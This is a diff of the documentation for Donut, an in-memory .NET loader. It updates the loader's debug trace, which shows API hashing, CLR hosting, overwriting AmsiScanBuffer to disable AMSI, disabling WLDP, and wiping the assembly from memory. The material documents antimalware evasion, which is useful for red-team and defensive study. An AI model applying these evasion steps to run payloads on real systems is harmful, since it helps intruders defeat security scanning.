@@ -404,71 +404,81 @@ DEBUG: donut.c:1088:DonutDelete(): Leaving.
 <p>Pass the instance as a parameter to payload.exe and it will run on the host system as if in a target environment.</p>
 
 <pre>
-C:\hub\donut\payload>payload ..\instance
+c:\hub\donut\payload>payload ..\instance
 Running...
-DEBUG: payload.c:49:ThreadProc(): Decrypting 17800 bytes of instance
-DEBUG: payload.c:56:ThreadProc(): Generating hash to verify decryption
-DEBUG: payload.c:58:ThreadProc(): Instance : 4564b30f0224473e | Result : 4564b30f0224473e
-DEBUG: payload.c:65:ThreadProc(): Resolving LoadLibraryA
-DEBUG: payload.c:71:ThreadProc(): Loading ole32.dll ...
-DEBUG: payload.c:71:ThreadProc(): Loading oleaut32.dll ...
-DEBUG: payload.c:71:ThreadProc(): Loading wininet.dll ...
-DEBUG: payload.c:71:ThreadProc(): Loading mscoree.dll ...
-DEBUG: payload.c:75:ThreadProc(): Resolving 33 API
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 4DD1D6F1D46F6992
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 6E8B72FD465B8225
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 1AD174A08D809070
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 9DF4FC42AA7533FA
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 1D71AE5F24A5E7A6
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 7302D183648832CB
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 65E6E9499AC90BD8
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for B2A4F7DD6EAEB6F4
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 03E1876D08DFDC1F
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for DF30EF9017CD4DAF
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 34E097D741D604AD
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for CDC685B2D3AEF24F
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 12D4AE84222EEF0D
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for E7F17458F8324A18
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 0A0E697EAD910BA4
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 5245DCE7DC4D0487
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for E1F3BE3034467EAB
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 233A01573D7C3C61
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 703BB1F37AAA7DE8
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for DB576B97A102B224
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 2B5342F6FBAD9798
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for E06936DC65A9106E
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for EFED0D64262F4206
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 570466BEBCE01375
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 2C4FF0220C5C7D9A
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for CF9D38D7AE64BAFE
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 8550BCC6C66B871E
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for AD2EB4CF8F3A11E8
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 1FC297FF9724F003
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 58E56592C50101DA
-DEBUG: peb.c:87:FindExport(): 58e56592c50101da is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
+DEBUG: payload.c:45:ThreadProc(): Maru IV : 1899033E0863343E
+DEBUG: payload.c:48:ThreadProc(): Resolving address for VirtualAlloc() : 9280348A6A2AFA7
+DEBUG: payload.c:52:ThreadProc(): Resolving address for VirtualAlloc() : 3A49032E4107D985
+DEBUG: payload.c:61:ThreadProc(): VirtualAlloc : 77535ED0 VirtualFree : 77535EF0
+DEBUG: payload.c:63:ThreadProc(): Allocating 17800 bytes of RW memory
+DEBUG: payload.c:70:ThreadProc(): Copying 17800 bytes of data to memory 008D0000
+DEBUG: payload.c:74:ThreadProc(): Zero initializing PDONUT_ASSEMBLY
+DEBUG: payload.c:82:ThreadProc(): Decrypting 17800 bytes of instance
+DEBUG: payload.c:89:ThreadProc(): Generating hash to verify decryption
+DEBUG: payload.c:91:ThreadProc(): Instance : c16c69caa83fb13f | Result : c16c69caa83fb13f
+DEBUG: payload.c:98:ThreadProc(): Resolving LoadLibraryA
+DEBUG: payload.c:104:ThreadProc(): Loading ole32.dll ...
+DEBUG: payload.c:104:ThreadProc(): Loading oleaut32.dll ...
+DEBUG: payload.c:104:ThreadProc(): Loading wininet.dll ...
+DEBUG: payload.c:104:ThreadProc(): Loading mscoree.dll ...
+DEBUG: payload.c:108:ThreadProc(): Resolving 33 API
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 066A0ED9815D3C92
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for F3569749C64E1DA5
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 09280348A6A2AFA7
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 3A49032E4107D985
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for FDE50FEB629EB834
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 4A4C764EFA89A84F
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 5D388BA18E017E53
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 4EA2B25D8FAABD2B
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for F1D278132E49F050
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for D05386A0F8FF7CAD
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 8121B63764A390A6
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for EB2BFAA408124470
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 11B666F77E7303F6
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for E8BD6B7A99981E38
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for DE78E211DE61998B
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 09D967C5479A0F9F
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 6CA1D167C2BFFA9A
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for AD11F6324A205C5E
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 5EAEF345362A2811
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for A0CC0DC36E8EDD2C
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for A4241EDCC8B14F85
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 756CEB8FF481A72E
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 8116A255193A09CA
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for AB14A786531404A1
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 1CF4A93D6896380A
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 61B393CC2DE33733
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for ADAF62D44179684A
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 7F9591B7380CD749
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 3CC76B29D676544F
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 725AA978FD2B1255
+DEBUG: peb.c:87:FindExport(): 725aa978fd2b1255 is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
 DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
 DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 2BA66279C8B60199
-DEBUG: peb.c:87:FindExport(): 2ba66279c8b60199 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 6C0F670F3C85A407
+DEBUG: peb.c:87:FindExport(): 6c0f670f3c85a407 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
 DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
 DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
-DEBUG: payload.c:78:ThreadProc(): Resolving API address for 0F7593A851FF9E51
-DEBUG: peb.c:87:FindExport(): 0f7593a851ff9e51 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 2996694CA69B44E8
+DEBUG: peb.c:87:FindExport(): 2996694ca69b44e8 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
 DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
 DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
-DEBUG: payload.c:93:ThreadProc(): Using module embedded in instance
+DEBUG: payload.c:127:ThreadProc(): Using module embedded in instance
 DEBUG: inmem_dotnet.c:43:LoadAssembly(): Using module embedded in instance
 DEBUG: inmem_dotnet.c:51:LoadAssembly(): CLRCreateInstance
-DEBUG: inmem_dotnet.c:59:LoadAssembly(): ICLRMetaHost::GetRuntime
+DEBUG: inmem_dotnet.c:59:LoadAssembly(): ICLRMetaHost::GetRuntime("v4.0.30319")
 DEBUG: inmem_dotnet.c:66:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
 DEBUG: inmem_dotnet.c:70:LoadAssembly(): ICLRRuntimeInfo::GetInterface
 DEBUG: inmem_dotnet.c:78:LoadAssembly(): HRESULT: 00000000
 DEBUG: inmem_dotnet.c:100:LoadAssembly(): ICorRuntimeHost::Start
-DEBUG: inmem_dotnet.c:107:LoadAssembly(): ICorRuntimeHost::CreateDomain
+DEBUG: inmem_dotnet.c:107:LoadAssembly(): ICorRuntimeHost::CreateDomain("TP7WFT9M")
 DEBUG: inmem_dotnet.c:115:LoadAssembly(): IUnknown::QueryInterface
+DEBUG: bypass.c:83:DisableAMSI(): Length of AmsiScanBuffer stub is 32 bytes.
+DEBUG: bypass.c:89:DisableAMSI(): Overwriting AmsiScanBuffer
+DEBUG: bypass.c:104:DisableAMSI(): Length of AmsiScanString stub is -16 bytes.
 DEBUG: inmem_dotnet.c:123:LoadAssembly(): DisableAMSI OK
 DEBUG: inmem_dotnet.c:127:LoadAssembly(): DisableWLDP OK
-DEBUG: inmem_dotnet.c:134:LoadAssembly(): Copying assembly to safe array
+DEBUG: inmem_dotnet.c:134:LoadAssembly(): Copying 3072 bytes of assembly to safe array
 DEBUG: inmem_dotnet.c:140:LoadAssembly(): AppDomain::Load_3
 DEBUG: inmem_dotnet.c:147:LoadAssembly(): HRESULT : 00000000
 DEBUG: inmem_dotnet.c:149:LoadAssembly(): Erasing assembly from memory
@@ -491,6 +501,8 @@ DEBUG: inmem_dotnet.c:353:FreeAssembly(): ICorRuntimeHost::Stop
 DEBUG: inmem_dotnet.c:356:FreeAssembly(): ICorRuntimeHost::Release
 DEBUG: inmem_dotnet.c:362:FreeAssembly(): ICLRRuntimeInfo::Release
 DEBUG: inmem_dotnet.c:368:FreeAssembly(): ICLRMetaHost::Release
+DEBUG: payload.c:171:ThreadProc(): Erasing RW memory for instance
+DEBUG: payload.c:174:ThreadProc(): Releasing RW memory for instance
 </pre>
 
 <p>Obviously you should be cautious with what files you decide to execute on your machine.</p>
